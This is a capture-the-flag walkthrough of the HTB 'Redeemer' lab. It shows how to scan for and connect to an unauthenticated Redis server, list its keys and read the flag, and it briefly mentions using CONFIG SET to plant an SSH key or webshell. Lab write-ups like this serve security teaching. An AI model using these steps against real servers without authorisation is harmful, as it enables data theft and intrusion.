# HTB Starting Point — Redeemer

**Difficulty:** Very Easy
**Category:** Database (Redis)

## Overview

Redeemer targets an exposed Redis instance with no authentication configured.
Redis is an in-memory key-value store, and once connected, its data can be
browsed and read directly from the command line.

## 1. Enumeration

```bash
ping <target_IP>
nmap -p- -sV <target_IP>
```

Only one port is open:

| Port | Service | Version |
|------|---------|---------|
| 6379/tcp | Redis | Redis key-value store 5.0.7 |

## 2. Installing the Client

```bash
sudo apt install redis-tools
```

## 3. Connecting

```bash
redis-cli -h <target_IP>
```

The connection succeeds immediately — no password is required.

## 4. Enumerating the Database

```
info
```

The `# Keyspace` section shows a single logical database, index `0`, holding
4 keys.

```
select 0
keys *
```

This lists the keys: `temp`, `stor`, `numb`, `flag`.

## 5. Reading the Flag

```
get flag
```

This returns the flag value directly.

## Takeaways

- Redis has no authentication by default unless `requirepass` is explicitly
  configured — exposing it to an untrusted network is a critical
  misconfiguration.
- `info`, `select`, `keys *`, and `get <key>` are enough to fully enumerate
  an unauthenticated Redis instance.
- In a real assessment, an open Redis server can also be a foothold for
  further attacks (e.g. writing an SSH key or webshell via `CONFIG SET`), not
  just a place to read cached data.
